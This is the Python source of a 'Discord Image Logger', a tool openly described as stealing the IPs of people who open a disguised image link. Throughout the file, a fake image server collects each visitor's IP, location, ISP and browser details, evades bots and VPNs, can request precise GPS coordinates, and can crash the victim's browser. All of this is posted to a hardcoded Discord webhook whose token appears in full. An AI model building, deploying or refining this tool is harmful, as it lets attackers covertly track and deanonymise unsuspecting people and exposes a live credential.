# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1445091160375820391/wGwYmMPfATwDy9Y15y70rp5r4Q61uuMMyy35B9adf_sONyaYedMDv_u89eiNqqH8xVXV",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
